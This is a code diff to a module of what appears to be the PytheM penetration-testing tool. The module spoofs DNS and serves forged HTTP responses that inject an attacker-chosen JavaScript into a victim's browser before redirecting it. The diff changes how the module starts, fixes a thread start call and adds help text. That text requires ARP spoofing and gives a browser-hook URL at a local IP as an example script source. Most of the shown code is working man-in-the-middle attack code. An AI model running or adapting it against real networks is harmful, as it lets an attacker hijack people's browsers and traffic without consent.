@@ -29,25 +29,11 @@ class Redirect(object):
     version = "0.3"
     ps = "Will need to change the way of injection to netfilter packet injection."
 
-    def __init__(self, host, port, js):
-        self.host = host
-        self.port = port
-        from dnspoisoner import DNSspoof
-        self.dnsspoof = DNSspoof(self.host)
-        if js != None:
-            self.js = js
-        else:
-            try:
-                self.js = raw_input("[+] Enter the script source: ")
-            except KeyboardInterrupt:
-                pass
-
+    def __init__(self):
+        self.host = None
+        self.port = None
+        self.js = None
         self.response = """ HTTP/1.1 200 OK
-Date: Thu, 12 Apr 2016 15:25 GMT
-Server: Apache/2.2.17 (Unix) mod ssl/2.2 17 OpenSSL/0.9.8l DAV/2
-Last-Modified: Sat, 28 Aug 2015 22:17:02 GMT
-ETag: "20e2b8b-3c-48ee99731f380"
-Accept-Ranges: bytes
 Content-Lenght: 90
 Connection: close
 Content-Type: text/html
@@ -58,10 +44,22 @@ Content-Type: text/html
 </head>
 """.format(self.js)
 
-    def start(self):
+    def start(self, host, port, js):
+        self.host = host
+        self.port = port
+        from dnspoisoner import DNSspoof
+        self.dnsspoof = DNSspoof()
+        if js != None:
+            self.js = js
+        else:
+            try:
+                self.js = raw_input("[+] Enter the script source: ")
+            except KeyboardInterrupt:
+                pass
+
         self.t = threading.Thread(name='Redirection', target=self.server)
         self.t.setDaemon(True)
-        self.t.start
+        self.t.start()
 
     def stop(self):
         try:
@@ -72,7 +70,7 @@ Content-Type: text/html
 
     def server(self):
         print "[+] Redirect with script injection initialized."
-        self.dnsspoof.start(None, "Inject")
+        self.dnsspoof.start(None, "Inject",self.host)
 
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -106,3 +104,17 @@ Content-Type: text/html
                 connection.close()
             except KeyboardInterrupt:
                 server.close()
+
+
+redirect_help = """\n
+[Help] Start to inject a source script into target browser then redirect to original destination.
+[Required] ARP spoof started.
+parameters:
+ - start
+ - stop
+ - status
+ - help
+example:
+pythem> redirect start
+[+] Enter the script source: http://192.168.1.6:3000/hook.js
+\n"""
